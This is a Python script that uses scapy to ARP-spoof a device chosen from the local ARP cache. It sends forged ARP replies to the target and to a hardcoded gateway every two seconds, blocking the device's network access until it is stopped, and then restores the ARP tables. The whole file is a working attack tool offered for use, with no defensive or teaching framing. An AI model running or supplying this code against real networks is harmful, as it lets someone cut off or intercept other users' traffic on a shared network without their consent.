from scapy.all import Ether, ARP, get_if_hwaddr, srp, send, getmacbyip, conf, sendp
import subprocess
import re
import time

def spoof(target_ip, target_mac, spoof_ip):
    iface = conf.iface
    my_mac = get_if_hwaddr(iface)
    ether = Ether(dst=target_mac, src=my_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=my_mac)
    packet = ether / arp
    sendp(packet, iface=iface, verbose=False)

def restore(target_ip, target_mac, source_ip, source_mac):
    print(f"[+] Restoring ARP table for {source_ip}...")
    ether = Ether(dst=target_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=source_mac,
              psrc=source_ip, hwsrc=source_mac)
    packet = ether / arp
    sendp(packet, count=5, verbose=False)

def get_arp_cache():
    devices = []
    output = subprocess.check_output(["arp", "-a"], text=True)
    lines = output.splitlines()
    for line in lines:
        # This regex matches IP and MAC from arp -a output line
        match = re.search(r'\(([\d\.]+)\) at ([\da-fA-F:]+)', line)
        if match:
            ip = match.group(1)
            mac = match.group(2)
            devices.append({"ip": ip, "mac": mac})
    return devices

def main():
    devices = get_arp_cache()
    for index, device in enumerate(devices):
        print(f"{index + 1}  |  {device['ip']}      {device['mac']}")

    device_id = int(input("Device Number: "))
    device_to_block = devices[device_id - 1]

    target_ip = device_to_block['ip']
    target_mac = device_to_block['mac']
    gateway_ip = '192.168.0.1'
    gateway_mac = getmacbyip(gateway_ip)
    print(f"[!] Starting ARP spoof to block {target_ip}... (Ctrl+C to stop)")

    try:
        while True:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Restoring network...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[+] Network restored.")

if __name__ == "__main__":
    main()

